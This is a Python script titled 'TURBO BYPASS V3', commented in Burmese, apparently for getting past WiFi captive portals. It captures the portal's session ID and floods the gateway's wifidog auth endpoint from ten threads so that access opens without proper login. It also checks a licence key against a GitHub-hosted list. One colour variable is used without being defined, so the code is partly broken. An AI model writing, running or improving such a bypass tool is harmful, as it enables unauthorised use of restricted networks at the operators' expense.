#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import urllib3
import time
import threading
import random
import os
import sys
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# CONFIGURATION
# ===============================
GITHUB_KEY_URL = "https://raw.githubusercontent.com/phyoewai1026-hash/my-bypass-key/main/keys.txt"
LOCAL_KEYS_FILE = os.path.expanduser("~/.turbo_approved.txt")

# Colors
red, bred = "\033[0;31m", "\033[1;31m"
green, bgreen = "\033[0;32m", "\033[1;32m"
yellow, byellow = "\033[0;33m", "\033[1;33m"
cyan, bcyan = "\033[0;36m", "\033[1;36m"
reset = "\033[00m"

def get_system_key():
    try:
        uid = os.geteuid()
        user = os.environ.get('USER', 'unknown')
        return f"{uid}{user}"
    except: return "1000unknown"

def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

# ===============================
# AUTO VERIFY (နောက်ကွယ်မှ စစ်ပေးမည့်အပိုင်း)
# ===============================
def background_verify():
    """အင်တာနက်ရလာရင် နောက်ကွယ်ကနေ Key ကို စစ်ပြီး ဖုန်းထဲသိမ်းမယ်"""
    my_key = get_system_key()
    while True:
        if check_real_internet():
            try:
                r = requests.get(GITHUB_KEY_URL, timeout=10)
                if r.status_code == 200:
                    if my_key in r.text:
                        with open(LOCAL_KEYS_FILE, 'w') as f: f.write(my_key)
                        break # စစ်ပြီးရင် ရပ်မယ်
            except: pass
        time.sleep(10) # ၁၀ စက္ကန့်တစ်ခါ အင်တာနက်ရမရ စစ်မယ်

# ===============================
# ENGINE
# ===============================
def high_speed_ping(auth_link):
    session = requests.Session()
    while True:
        try:
            session.get(auth_link, timeout=5, verify=False)
            print(f"{green}[✓]{reset} ENGINE RUNNING | STATUS: ACTIVE   ", end="\r")
        except: pass
        time.sleep(random.uniform(0.05, 0.1))

def start_engine():
    os.system('clear')
    print(f"{bcyan}╔════════════════════════════════════════════════╗")
    print(f"║          TURBO BYPASS V3 (INSTANT)             ║")
    print(f"╚════════════════════════════════════════════════╝{reset}")
    print(f"[*] ID: {byellow}{get_system_key()}{reset}\n")
    
    print(f"{cyan}[*] Detecting Portal...{reset}")
    try:
        # Portal ရှာဖွေခြင်း
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        portal_url = r.url
        
        # SID Capture လုပ်ခြင်း
        parsed = urlparse(portal_url)
        sid = parse_qs(parsed.query).get('sessionId', [None])[0]
        if not sid:
            r2 = requests.get(portal_url, verify=False, timeout=5)
            match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', r2.text)
            sid = match.group(1) if match else None

        if sid:
            gw_ip = parsed.netloc.split(':')[0] if parsed.netloc else "192.168.110.1"
            print(f"{green}[✓] SID Captured: {sid}{reset}")
            print(f"{green}[✓] Gateway: {gw_ip}{reset}")
            
            auth_link = f"http://{gw_ip}:2060/wifidog/auth?token={sid}"
            
            # နောက်ကွယ်မှာ Key စစ်ဖို့ Thread ဖွင့်မယ်
            threading.Thread(target=background_verify, daemon=True).start()
            
            # Engine စမယ်
            print(f"\n{purple}[!] Engine Started Successfully!{reset}")
            for _ in range(10):
                threading.Thread(target=high_speed_ping, args=(auth_link,), daemon=True).start()
            
            while True: time.sleep(1)
        else:
            print(f"{red}[X] Error: SID မတွေ့ပါ။ Browser မှာ Login Page ဖွင့်ထားပါ။{reset}")
    except Exception as e:
        print(f"{red}[!] Error: {e}{reset}")

if __name__ == "__main__":
    try:
        # Offline Approved ဖြစ်ဖူးလား အရင်စစ်မယ်
        my_id = get_system_key()
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                if f.read().strip() == my_id:
                    start_engine()
                    sys.exit()

        # Approved မဖြစ်သေးရင်လည်း Engine ကို အရင်ပေးပွင့်မယ်
        start_engine()
    except KeyboardInterrupt:
        print(f"\n{red}Stopped.{reset}")
        sys.exit()
            
